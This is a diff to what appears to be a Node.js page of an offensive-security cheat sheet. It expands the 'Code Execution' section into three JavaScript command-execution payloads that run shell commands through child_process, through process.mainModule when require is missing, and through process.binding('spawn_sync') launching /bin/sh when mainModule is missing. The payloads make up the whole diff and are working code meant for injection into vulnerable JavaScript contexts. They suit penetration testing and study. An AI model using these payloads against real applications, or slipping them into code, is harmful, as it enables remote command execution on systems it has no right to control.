@@ -12,11 +12,21 @@ description: The backend for running JavaScript as a server or application
 
 ## Code Execution
 
-```javascript
-require("child_process").execSync("id").toString()
-
-process.mainModule.require("child_process").execSync("id").toString()
-```
+<pre class="language-javascript"><code class="lang-javascript">// Simplest
+<strong>require("child_process").execSync("id").toString()
+</strong>// When require() is undefined
+<strong>process.mainModule.require("child_process").execSync("id").toString()
+</strong>// When process.mainModule is undefined
+<strong>process.binding('spawn_sync').spawn({
+</strong><strong>    file: '/bin/sh',
+</strong><strong>    args: ['sh', '-c', 'id'],
+</strong><strong>    stdio: [
+</strong><strong>        {type:'pipe',readable:1,writable:0},
+</strong><strong>        {type:'pipe',readable:0,writable:1},
+</strong><strong>        {type:'pipe',readable:0,writable:1}
+</strong><strong>    ]
+</strong><strong>}).output.toString()
+</strong></code></pre>
 
 ## Template Injection (SSTI)
 
